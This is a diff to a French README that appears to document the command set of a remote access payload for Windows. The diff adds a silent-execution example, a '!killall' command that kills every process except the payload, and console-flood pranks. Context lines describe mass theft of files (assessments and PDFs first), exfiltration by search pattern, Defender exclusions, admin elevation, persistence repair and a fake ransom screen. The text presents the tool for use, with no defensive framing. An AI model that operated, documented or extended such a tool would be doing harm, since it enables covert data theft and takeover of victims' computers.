@@ -89,7 +89,7 @@ veille des nouveaux fichiers (15 s), réparation de persistance (3 min).
 |---|---|
 | `!download <cible>` | envoie fichier ou dossier (zip automatique) |
 | `!upload <url> <dest>` | télécharge depuis une URL |
-| `!exec <fichier> [args]` | exécute un fichier local |
+| `!exec <fichier> [args]` | exécute un fichier local — ex. `!exec C:\Temp\setup.exe /S` |
 | `!files` | extraction massive (évaluations et PDF d'abord) |
 | `!search <motif> [n]` | envoie les fichiers qui contiennent le motif |
 | `!images` | toutes les images du poste |
@@ -129,7 +129,8 @@ veille des nouveaux fichiers (15 s), réparation de persistance (3 min).
 | `!defender` / `!defender exclude` | état Defender / exclusions (admin) |
 | `!elevate <cmd>` | PowerShell en admin (invite UAC sur la machine) |
 | `!power sleep\|lock\|logoff\|off\|restart` | veille, verrou, déconnexion, arrêt, redémarrage |
-| `!shutdown [r] [secondes]` | arrêt ou redémarrage |
+| `!shutdown [r] [secondes]` | arrêt ou redémarrage (`!shutdown abort` annule) |
+| `!killall confirm` | ferme tous les processus sauf Windows et le payload |
 | `!delete confirm` | SUPPRESSION TOTALE du payload |
 
 ### Réseau
@@ -160,6 +161,8 @@ Toutes réversibles, aucune ne détruit de fichier.
 | `!prank ransom` | faux écran de rançon (purement visuel) |
 | `!prank jiggle` | agite la souris |
 | `!prank keyboard` | bloque clavier et souris 10 s |
+| `!prank flood 20 Bonjour` | ouvre 20 consoles avec le texte choisi |
+| `!prank stop` | ferme les consoles du prank |
 
 ---
 
